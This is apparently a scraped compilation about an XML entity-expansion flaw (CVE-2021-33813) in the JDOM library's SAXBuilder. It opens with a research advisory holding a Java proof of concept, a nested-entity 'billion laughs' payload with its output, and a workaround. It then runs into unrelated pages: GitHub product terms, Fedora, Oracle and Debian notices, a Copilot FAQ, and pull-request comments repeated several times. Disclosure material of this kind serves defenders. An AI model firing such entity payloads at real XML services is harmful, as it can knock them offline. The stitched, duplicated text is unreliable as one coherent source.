# XXE in JDOM library - Java

Aleph Research Advisory

## Identifier

[CVE-2021-33813](/vulns/aleph-2021003)
## Severity

Moderate
## Product

* JDOM library

## Vulnerable Version

* JDOM-2.0.6 and before

## Technical Details

While working with the JDOM library, We have found a bug in SAXBuilder class that might lead to an XXE vulnerability.
According to OWASP, to avoid XXE vulnerability, we need to configure the parser not to allow external entities by
using setFeature() method with the following values:

```
parser.setFeature("http://xml.org/sax/features/external-general-entities", false).

```

We have found that it does not matter which value is set in this feature. Whether it is true or false,
external-general-entities will use the value from the Expand Entity.

Our suggested code fix is that setting user-specified features should be done after the set entity expansion. Since that user-specified configuration should have higher priority to avoid XXE.

Our mitigation, until a version fix is out, is to add configuration for ExpandEntity that should protect the parser from XXE:

```
builder.setExpandEntities(false);

```

Exploit example for the XXE bomb attack(billion laughs attack):

```
void test_SAXBuilder(HttpServletRequest request, HttpServletResponse response) throws IOException {

    String xmlParam = "<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY bar \"World \">
	<!ENTITY t1 \"&bar;&bar;\"><!ENTITY t2 \"&t1;&t1;&t1;&t1;\">
	<!ENTITY t3 \"&t2;&t2;&t2;&t2;&t2;\">]><foo>Hello &t3;</foo>";

    try {
        // disallow-doctype-decl is set to true and after parsing will hold value true
        SAXBuilder builder = new SAXBuilder();
        builder.setFeature("http://xml.org/sax/features/external-general-entities", true);
        builder.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        //builder.setExpandEntities(false);
        Document doc = builder.build(new InputSource(new StringReader(xmlParam)));
        String s="";
        for ( Content content : doc.getContent()) {
            s += content.getValue();
        }
        response.getWriter().println("external-general-entities: true, content: " + s);
    } catch (JDOMException e) {
    }

    try {
        // disallow-doctype-decl is set to false and after parsing will hold value true
        SAXBuilder builder = new SAXBuilder();
        builder.setFeature("http://xml.org/sax/features/external-general-entities", false);
        builder.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        //builder.setExpandEntities(false);
        Document doc = builder.build(new InputSource(new StringReader(xmlParam)));
        String s="";
        for ( Content content : doc.getContent()) {
            s += content.getValue();
        }
        response.getWriter().println("external-general-entities: false, content: " + s);
    } catch (JDOMException e) {
    }

    try {
        // disallow-doctype-decl is set to true and after parsing will hold value false
        // due to expandEntity value
        SAXBuilder builder = new SAXBuilder();
        builder.setFeature("http://xml.org/sax/features/external-general-entities", true);
        builder.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        builder.setExpandEntities(false);
        Document doc = builder.build(new InputSource(new StringReader(xmlParam)));
        String s="";
        for ( Content content : doc.getContent()) {
            s += content.getValue();
        }
        response.getWriter().println("external-general-entities: true, ExpandEntities: false, content: " + s);
    } catch (JDOMException e) {
    }
  try {
        // disallow-doctype-decl is set to true and after parsing will hold value false
        // due to expandEntity value
        SAXBuilder builder = new SAXBuilder();
        builder.setFeature("http://xml.org/sax/features/external-general-entities", false);
        builder.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        builder.setExpandEntities(false);
        Document doc = builder.build(new InputSource(new StringReader(xmlParam)));
        String s="";
        for ( Content content : doc.getContent()) {
             s += content.getValue();
        }
        response.getWriter().println("external-general-entities: true, ExpandEntities: false,  content: " + s);
    } catch (JDOMException e) {
    }
}

```

The output html is:

```
<html>
  <body>
    external-general-entities: true, content: Hello World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World
    external-general-entities: false, content: Hello World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World
    external-general-entities: true, ExpandEntities: false, content: Hello
    external-general-entities: false, ExpandEntities: false, content: Hello
  </body>
</html>

Version Effective Date: December 18, 2024

When you use GitHub, you may be given access to lots of additional products and features ("Additional Products and Features"). Because many of the Additional Products and Features offer different functionality, your Agreement with us (the "Agreement") includes the specific terms for that product or feature combined with your main agreement — the GitHub Terms of Service or GitHub Customer Agreement, or the GitHub Corporate Terms of Service or other legacy GitHub contract, or a Microsoft volume licensing agreement. Below, we've listed those products and features, along with the corresponding additional terms that apply to your use of them.

By using the Additional Products and Features, you also agree to the applicable GitHub Terms for Additional Products and Features listed below. A violation of these GitHub Terms for Additional Products and Features is a violation of the Agreement. Capitalized terms not defined here have the meaning given in the Agreement.

**For Enterprise users**

* **GitHub Enterprise Cloud** users may have access to the following Additional Products and Features: Actions, Advanced Security, Advisory Database, Codespaces, Dependabot Preview, GitHub Enterprise Importer, Packages, and Pages.
* **GitHub Enterprise Server** users may have access to the following Additional Products and Features: Actions, Advanced Security, Advisory Database, Connect, Dependabot Preview, GitHub Enterprise Importer, Packages, Pages, and SQL Server Images.

## [Actions](#actions)

GitHub Actions enables you to create custom software development lifecycle workflows directly in your GitHub repository. Actions is billed on a usage basis. The [Actions documentation](/en/actions) includes details, including compute and storage quantities (depending on your Account plan), and how to monitor your Actions minutes usage and set usage limits.

Actions and any elements of the Actions product or service may not be used in violation of the Agreement, the [GitHub Acceptable Use Policies](/en/site-policy/acceptable-use-policies/github-acceptable-use-policies), or the GitHub Actions service limitations set forth in the [Actions documentation](/en/actions/learn-github-actions/usage-limits-billing-and-administration). Additionally, regardless of whether an Action is using self-hosted runners, Actions should not be used for:

* Cryptomining;
* Disrupting, gaining, or attempting to gain unauthorized access to, any service, device, data, account, or network (other than those authorized by the [GitHub Bug Bounty program](https://bounty.github.com));
* The provision of a stand-alone or integrated application or service offering the Actions product or service, or any elements of the Actions product or service, for commercial purposes;
* Any activity that places a burden on our servers, where that burden is disproportionate to the benefits provided to users (for example, don't use Actions as a content delivery network or as part of a serverless application, but a low benefit Action could be ok if it’s also low burden); or
* If using GitHub-hosted runners, any other activity unrelated to the production, testing, deployment, or publication of the software project associated with the repository where GitHub Actions are used.

In order to prevent violations of these limitations and abuse of GitHub Actions, GitHub may monitor your use of GitHub Actions. Misuse of GitHub Actions may result in termination of jobs, restrictions in your ability to use GitHub Actions, disabling of repositories created to run Actions in a way that violates these Terms, or in some cases, suspension or termination of your GitHub account.

*Use for Development and Testing*

You may only access and use GitHub Actions to develop and test your application(s). Only one licensed user may access a virtual machine provided by Actions at any time.

*Authorized Developer*

You appoint GitHub as your authorized developer with respect to Apple software included in Actions. GitHub is responsible for complying with the terms for any such software included in Actions and will keep confidential any confidential information of Apple accessed as part of Actions.

*Third Party Repository Service Access*

If you grant GitHub access to your third-party repository service account(s), you authorize GitHub to scan the account(s), including the contents of your Public and Private Repositories, for purposes of providing GitHub Actions.

*Self-Hosted Runners on GitHub Actions*

If you use self-hosted runners, you have the ability to turn off automatic updates but GitHub reserves the right to override your choice for critical security updates.

## [Advanced Security](#advanced-security)

GitHub makes extra security features available to customers under an Advanced Security license. These features include code scanning, secret scanning, and dependency review. The [Advanced Security documentation](/en/get-started/learning-about-github/about-github-advanced-security) provides more details.

Advanced Security is licensed on a "Unique Committer" basis. A "Unique Committer" is a licensed user of GitHub Enterprise, GitHub Enterprise Cloud, or GitHub Enterprise Server, who has made a commit in the last 90 days to any repository with any GitHub Advanced Security functionality activated. You must acquire a GitHub Advanced Security User license for each of your Unique Committers. You may only use GitHub Advanced Security on codebases that are developed by or for you. For GitHub Enterprise Cloud users, some Advanced Security features also require the use of GitHub Actions.

For secret scanning with GitHub Advanced Security, when you opt-in to automatic validity checks for partner patterns, exposed third-party tokens may be shared with the relevant partner, in order to provide you with more information about the validity of the token. Not all partners are based in the United States. The [Secret scanning patterns documentation](/en/enterprise-cloud%40latest/code-security/secret-scanning/introduction/supported-secret-scanning-patterns) provides more details on which partners support the validity check.

## [Advisory Database](#advisory-database)

The GitHub Advisory Database allows you to browse or search for vulnerabilities that affect open source projects on GitHub.

*License Grant to Us*

We need the legal right to submit your contributions to the GitHub Advisory Database into public domain datasets such as the [National Vulnerability Database](https://nvd.nist.gov/) and to license the GitHub Advisory Database under open terms for use by security researchers, the open source community, industry, and the public. You agree to release your contributions to the GitHub Advisory Database under the [Creative Commons Zero license](https://creativecommons.org/publicdomain/zero/1.0/).

*License to the GitHub Advisory Database*

The GitHub Advisory Database is licensed under the [Creative Commons Attribution 4.0 license](https://creativecommons.org/licenses/by/4.0/). The attribution term may be fulfilled by linking to the GitHub Advisory Database at <https://github.com/advisories> or to individual GitHub Advisory Database records used, prefixed by <https://github.com/advisories>.

## [Codespaces](#codespaces)

*Note: The github.dev service, available by pressing . on a repo or navigating directly to github.dev, is governed by GitHub's Beta Terms of service.*

GitHub Codespaces enables you to develop code directly from your browser using the code within your GitHub repository. Codespaces and any elements of the Codespaces service may not be used in violation of the Agreement or the Acceptable Use Policies. Additionally, Codespaces should not be used for:

* Cryptomining;
* Using our servers to disrupt, or to gain or to attempt to gain unauthorized access to any service, device, data, account or network (other than those authorized by the GitHub Bug Bounty program);
* The provision of a stand-alone or integrated application or service offering Codespaces or any elements of Codespaces for commercial purposes;
* Any activity that places a burden on our servers, where that burden is disproportionate to the benefits provided to users (for example, don't use Codespaces as a content delivery network, as part of a serverless application, or to host any kind of production-facing application); or
* Any other activity unrelated to the development or testing of the software project associated with the repository where GitHub Codespaces is initiated.

In order to prevent violations of these limitations and abuse of GitHub Codespaces, GitHub may monitor your use of GitHub Codespaces. Misuse of GitHub Codespaces may result in termination of your access to Codespaces, restrictions in your ability to use GitHub Codespaces, or the disabling of repositories created to run Codespaces in a way that violates these Terms.

Codespaces allows you to load extensions from the Microsoft Visual Studio Marketplace (“Marketplace Extensions”) for use in your development environment, for example, to process the programming languages that your code is written in. Marketplace Extensions are licensed under their own separate terms of use as noted in the Visual Studio Marketplace, and the terms of use located at <https://aka.ms/vsmarketplace-ToU>. GitHub makes no warranties of any kind in relation to Marketplace Extensions and is not liable for actions of third-party authors of Marketplace Extensions that are granted access to Your Content. Codespaces also allows you to load software into your environment through devcontainer features. Such software is provided under the separate terms of use accompanying it. Your use of any third-party applications is at your sole risk.

The generally available version of Codespaces is not currently available for U.S. government customers. U.S. government customers may continue to use the Codespaces Beta Preview under separate terms. See [Beta Preview terms](/en/site-policy/github-terms/github-terms-of-service#j-beta-previews).

## [Competitive Benchmarking](#competitive-benchmarking)

If you offer a product or service competitive to any GitHub product or service, by using that GitHub product or service, you agree to and hereby waive any restrictions as to GitHub on competitive use and benchmark testing in the terms governing your competitive product or service. If you do not intend to waive such restrictions in your terms of use, you are not allowed to use that GitHub product or service.

## [Connect](#connect)

With GitHub Connect, you can share certain features and data between your GitHub Enterprise Server deployment and your GitHub Enterprise Cloud organization or enterprise account on GitHub.com. In order to enable GitHub Connect, you must have at least one (1) account on GitHub Enterprise Cloud or GitHub.com, and one (1) licensed deployment of GitHub Enterprise Server. Your use of GitHub Enterprise Cloud or GitHub.com through Connect is governed by the terms under which you license GitHub Enterprise Cloud or GitHub.com. Use of Personal Data is governed by the [GitHub Privacy Statement](/en/site-policy/privacy-policies/github-privacy-statement).

## [GitHub Copilot](#github-copilot)

For GitHub Copilot Business and Copilot Enterprise license holders, your use of GitHub Copilot is governed by the [GitHub Copilot Product Specific Terms](https://github.com/customer-terms/github-copilot-product-specific-terms).

For other GitHub Copilot license holders, your use of GitHub Copilot is governed by the following terms:
To use GitHub Copilot in your code editor, you need to install the GitHub Copilot extension to that editor. To use GitHub Copilot in the CLI (Command Line Interface), you need to install the GitHub Copilot CLI extension. To use GitHub Copilot Chat on GitHub Mobile, you need to install the GitHub Mobile application. To use GitHub Copilot on the GitHub.com, you must access the website.

If you customize GitHub Copilot, to include using a GitHub Copilot Extension (Extension), your use may be subject to the terms of use and privacy policy applicable to the customization.

The code you write using GitHub Copilot is not “Content” under the Agreement until you upload it to GitHub.com. The code, functions, and other output returned to you by GitHub Copilot are called “**Suggestions**.” GitHub does not own Suggestions. You retain ownership of Your Code and you retain responsibility for Suggestions you include in Your Code. It is entirely your decision whether to use Suggestions generated by GitHub Copilot. If you use Suggestions, GitHub strongly recommends that you have reasonable policies and practices in place designed to prevent the use of a Suggestion in a way that may violate the rights of others.

*Acceptable Use*

Your use of GitHub Copilot is subject to the GitHub [Acceptable Use Policies](/en/site-policy/acceptable-use-policies/github-acceptable-use-policies). For example, you may not prompt GitHub Copilot with content that is unlawful or otherwise prohibited by the GitHub Acceptable Use Policies on GitHub.com. If you choose to "Allow" Copilot to provide [Suggestions matching public code](/en/enterprise-cloud%40latest/copilot/using-github-copilot/finding-public-code-that-matches-github-copilot-suggestions?tool=vscode), you must comply with cited licenses.

*Data*

GitHub Copilot (i) may collect and process data based on your settings and the specific GitHub Copilot Service you use - this may include Prompts, Suggestions, and code snippets, and (ii) will collect additional usage information through the GitHub Copilot Service you use tied to your Account - this may include Service Usage Information, Website Usage Data, and Feedback Data. Upon your instructions, we may share this data with third-party applications such as those on the [GitHub Marketplace](https://github.com/marketplace) or third-party AI models of your choosing. This may include personal data, as referenced in the [GitHub Privacy Statement](/en/site-policy/privacy-policies/github-privacy-statement). You can learn more about the collection and use of GitHub Copilot data in the [GitHub Copilot Trust Center](https://resources.github.com/copilot-trust-center/).

For GitHub Copilot Free users, the data collected by GitHub Copilot may be used for AI Model training where permitted and if you allow in your settings.

## [GitHub Enterprise Importer](#github-enterprise-importer)

Importer is a framework for exporting data from other sources to be imported to the GitHub platform. Importer is provided “AS-IS”.

## [npm](#npm)

npm is a software package hosting service that allows you to host your software packages privately or publicly and use packages as dependencies in your projects. npm is the registry of record for the JavaScript ecosystem. The npm public registry is free to use but customers are billed if they want to publish private packages or manage private packages using teams. The [npm documentation](https://docs.npmjs.com/) includes details about the limitation of account types and how to manage [private packages](https://docs.npmjs.com/about-private-packages) and [organizations](https://docs.npmjs.com/organizations). Acceptable use of the npm registry is outlined in the [open-source terms](https://www.npmjs.com/policies/open-source-terms). There are supplementary terms for both the npm [solo](https://www.npmjs.com/policies/solo-plan) and [org](https://www.npmjs.com/policies/orgs-plan) plans. The npm [Terms of Use](https://www.npmjs.com/policies/terms) apply to your use of npm.

## [Packages](#packages)

GitHub Packages is a software package hosting service that allows you to host your software packages privately or publicly and use packages as dependencies in your projects. GitHub Packages is billed on a usage basis. The [Packages documentation](/en/packages/learn-github-packages/introduction-to-github-packages) includes details, including bandwidth and storage quantities (depending on your Account plan), and how to monitor your Packages usage and set usage limits. Packages bandwidth usage is limited by the [GitHub Acceptable Use Policies](/en/site-policy/acceptable-use-policies/github-acceptable-use-policies).

## [Pages](#pages)

Each Account comes with access to the [GitHub Pages static hosting service](/en/pages/getting-started-with-github-pages/about-github-pages). GitHub Pages is intended to host static web pages, but primarily as a showcase for personal and organizational projects.

GitHub Pages is not intended for or allowed to be used as a free web hosting service to run your online business, e-commerce site, or any other website that is primarily directed at either facilitating commercial transactions or providing commercial software as a service (SaaS). Some monetization efforts are permitted on Pages, such as donation buttons and crowdfunding links.

*Bandwidth and Usage Limits*

GitHub Pages are subject to some specific bandwidth and usage limits, and may not be appropriate for some high-bandwidth uses. Please see our [GitHub Pages limits](/en/pages/getting-started-with-github-pages/about-github-pages) for more information.

*Prohibited Uses*

GitHub Pages may not be used in violation of the Agreement, the GitHub [Acceptable Use Policies](/en/site-policy/acceptable-use-policies/github-acceptable-use-policies), or the GitHub Pages service limitations set forth in the [Pages documentation](/en/pages/getting-started-with-github-pages/about-github-pages#guidelines-for-using-github-pages).

If you have questions about whether your use or intended use falls into these categories, please contact us through the [GitHub Support portal](https://support.github.com/). GitHub reserves the right at all times to reclaim any GitHub subdomain without liability.

*Educational Exercises*

Using GitHub Pages to create a copy of an existing website as a learning exercise is not prohibited. However, you must write the code yourself, the site must not collect any user data, and you must include a prominent disclaimer on the site indicating that the project is not associated with the original and was only created for educational purposes.

## [Previews](#previews)

Previews means software, online services and additional products and features provided for preview, evaluation, demonstration or trial purposes, or pre-release versions of those, such as alpha, beta, or early access.

## Package

maven

([Maven](/advisories?query=ecosystem%3Amaven))

## Affected versions

<= 2.0.6

## Patched versions

None

## Description

An XXE issue in SAXBuilder in JDOM through 2.0.6 allows attackers to cause a denial of service via a crafted HTTP request. At this time there is not released fixed version of JDOM. As a workaround, to avoid external entities being expanded, one can call `builder.setExpandEntities(false)` and they won't be expanded.

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

| Hello,  I deal with the security aspects in OSS libs within SAO. I was wondering if there any way I can help you with the fix and preparing a release. Please let me know.  Thanks Sourabh |

| Yes, sure, at some point, but remember if you're worried about external entities being expanded, just call builder.setExpandEntities(false) and they won't be. That's what it's there for. |

### **[rolfl](/rolfl)** commented [Jul 2, 2021](#issuecomment-872685011)

| This PR changes the order of precedence between `setExpandEntities` and user-supplied features. It's a relatively small risk, but this PR will change existing code behaviour in the case where existing code has set the `"http://xml.org/sax/features/external-general-entities"` feature to a value that conflicts with `setExpendEntities`.  Previously, setExpendEntities overruled user-supplied features, and now the opposite is true.  Note, JDOM tries to "isolate" users from needing to know the internal guts of what underlying parsers are used, so the `setExpendEntities()` makes it simpler to manage the feature than knowing exactly which parser is being used, and whether it supports the feature change.  Further, the way I read this, I think it's possible now to set conflicting features with `"http://xml.org/sax/handlers/DeclHandler"`  This may need to be tweaked. |

| I think the better implementation for this fix would be to track whether setExpandEntities has been explicitly set, and if not, base it on whether the `http://xml.org/sax/features/external-general-entities` feature was explicitly set in the user overrides. |

| Yes, sure, at some point, but remember if you're worried about external entities being expanded, just call builder.setExpandEntities(false) and they won't be. That's what it's there for. |

### **[rolfl](/rolfl)** commented [Jul 2, 2021](#issuecomment-872685011)

| This PR changes the order of precedence between `setExpandEntities` and user-supplied features. It's a relatively small risk, but this PR will change existing code behaviour in the case where existing code has set the `"http://xml.org/sax/features/external-general-entities"` feature to a value that conflicts with `setExpendEntities`.  Previously, setExpendEntities overruled user-supplied features, and now the opposite is true.  Note, JDOM tries to "isolate" users from needing to know the internal guts of what underlying parsers are used, so the `setExpendEntities()` makes it simpler to manage the feature than knowing exactly which parser is being used, and whether it supports the feature change.  Further, the way I read this, I think it's possible now to set conflicting features with `"http://xml.org/sax/handlers/DeclHandler"`  This may need to be tweaked. |

| I think the better implementation for this fix would be to track whether setExpandEntities has been explicitly set, and if not, base it on whether the `http://xml.org/sax/features/external-general-entities` feature was explicitly set in the user overrides. |

Fedora Update Notification
FEDORA-2021-3cb0d02576
2021-10-29 22:48:33.392887
--------------------------------------------------------------------------------

Name : jdom2
Product : Fedora 35
Version : 2.0.6
Release : 24.fc35
URL : <http://www.jdom.org/>
Summary : Java manipulation of XML made easy
Description :
JDOM is a Java-oriented object model which models XML documents.
It provides a Java-centric means of generating and manipulating
XML documents. While JDOM inter-operates well with existing
standards such as the Simple API for XML (SAX) and the Document
Object Model (DOM), it is not an abstraction layer or
enhancement to those APIs. Rather, it seeks to provide a robust,
light-weight means of reading and writing XML data without the
complex and memory-consumptive options that current API
offerings provide.

| Yes, sure, at some point, but remember if you're worried about external entities being expanded, just call builder.setExpandEntities(false) and they won't be. That's what it's there for. |

### **[rolfl](/rolfl)** commented [Jul 2, 2021](#issuecomment-872685011)

| This PR changes the order of precedence between `setExpandEntities` and user-supplied features. It's a relatively small risk, but this PR will change existing code behaviour in the case where existing code has set the `"http://xml.org/sax/features/external-general-entities"` feature to a value that conflicts with `setExpendEntities`.  Previously, setExpendEntities overruled user-supplied features, and now the opposite is true.  Note, JDOM tries to "isolate" users from needing to know the internal guts of what underlying parsers are used, so the `setExpendEntities()` makes it simpler to manage the feature than knowing exactly which parser is being used, and whether it supports the feature change.  Further, the way I read this, I think it's possible now to set conflicting features with `"http://xml.org/sax/handlers/DeclHandler"`  This may need to be tweaked. |

| I think the better implementation for this fix would be to track whether setExpandEntities has been explicitly set, and if not, base it on whether the `http://xml.org/sax/features/external-general-entities` feature was explicitly set in the user overrides. |

## Oracle Critical Patch Update Advisory - April 2022

### Description

A Critical Patch Update is a collection of patches for multiple security vulnerabilities.  These patches address vulnerabilities in Oracle code and in third-party components included in Oracle products.  These patches are usually cumulative, but each advisory describes only the security patches added since the previous Critical Patch Update Advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security patches.  Refer to [“Critical Patch Updates, Security Alerts and Bulletins”](https://www.oracle.com/security-alerts/) for information about Oracle Security advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released security patches. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore strongly recommends that customers remain on actively-supported versions and apply Critical Patch Update security patches without delay.**

This Critical Patch Update contains 520 new security patches across the product families listed below. Please note that an MOS note summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at  [April 2022 Critical Patch Update: Executive Summary and Analysis](https://support.oracle.com/rs?type=doc&id=2857016.1).

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly addressed by the patches associated with this advisory. Risk matrices for previous security patches can be found in [previous Critical Patch Update advisories and Alerts](https://www.oracle.com/security-alerts). An English text version of the risk matrices provided in this document is  [here](/security-alerts/cpuapr2022verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](https://cve.mitre.org/) which is its unique identifier. A vulnerability that affects multiple products will appear with the same CVE# in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.1 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.1).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update. Oracle does not disclose detailed information about this security analysis to customers, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](https://www.oracle.com/us/support/assurance/disclosure-policies/index.html).

Oracle lists updates that address vulnerabilities in third-party components that are not exploitable in the context of their inclusion in their respective Oracle product beneath the product's risk matrix.

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Critical Patch Update security patches as soon as possible**. Until you apply the Critical Patch Update patches, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security patches as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security patches announced in this Critical Patch Update, please review [previous Critical Patch Update advisories](https://www.oracle.com/security-alerts) to determine appropriate actions.

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the  [Lifetime Support Policy](https://www.oracle.com/us/support/lifetime-support/index.html?ssSourceSiteId=otnen). Oracle recommends that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Database, Fusion Middleware, and Oracle Enterprise Manager products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/rs?type=doc&id=209768.1). Please review the [Technical Support Policies](https://www.oracle.com/us/support/policies/index.html?ssSourceSiteId=otnen) for further guidelines regarding support policies and phases of support.

#### Oracle Fusion Middleware Risk Matrix

This Critical Patch Update contains 54 new security patches plus additional third party patches noted below for Oracle Fusion Middleware.  41 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#FMW)

Oracle Fusion Middleware products include Oracle Database components that are affected by the vulnerabilities listed in the Oracle Database section. The exposure of Oracle Fusion Middleware products is dependent on the Oracle Database version being used. Oracle Database security updates are not listed in the Oracle Fusion Middleware risk matrix. However, since vulnerabilities affecting Oracle Database versions may affect Oracle Fusion Middleware products, Oracle recommends that customers apply the Critical Patch Update April 2022 to the Oracle Database components of Oracle Fusion Middleware products. For information on what patches need to be applied to your environments, refer to Critical Patch Update April 2022 Patch Availability Document for Oracle Products, [My Oracle Support Note 2853458.2](https://support.oracle.com/rs?type=doc&id=2853458.2).

# Debian Long Term Support

Debian Long Term Support (LTS) is a project to extend the lifetime of all Debian stable releases to (at least) 5 years. Debian LTS is not handled by the Debian Security and Release teams, but by a separate group of volunteers and companies interested in making it a success.

Thus the Debian LTS team takes over security maintenance of the various releases once the Debian Security team stops its work.

| Hello,  I deal with the security aspects in OSS libs within SAO. I was wondering if there any way I can help you with the fix and preparing a release. Please let me know.  Thanks Sourabh |

| Yes, sure, at some point, but remember if you're worried about external entities being expanded, just call builder.setExpandEntities(false) and they won't be. That's what it's there for. |

### **[rolfl](/rolfl)** commented [Jul 2, 2021](#issuecomment-872685011)

| This PR changes the order of precedence between `setExpandEntities` and user-supplied features. It's a relatively small risk, but this PR will change existing code behaviour in the case where existing code has set the `"http://xml.org/sax/features/external-general-entities"` feature to a value that conflicts with `setExpendEntities`.  Previously, setExpendEntities overruled user-supplied features, and now the opposite is true.  Note, JDOM tries to "isolate" users from needing to know the internal guts of what underlying parsers are used, so the `setExpendEntities()` makes it simpler to manage the feature than knowing exactly which parser is being used, and whether it supports the feature change.  Further, the way I read this, I think it's possible now to set conflicting features with `"http://xml.org/sax/handlers/DeclHandler"`  This may need to be tweaked. |

| I think the better implementation for this fix would be to track whether setExpandEntities has been explicitly set, and if not, base it on whether the `http://xml.org/sax/features/external-general-entities` feature was explicitly set in the user overrides. |

### Frequently asked questions

#### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

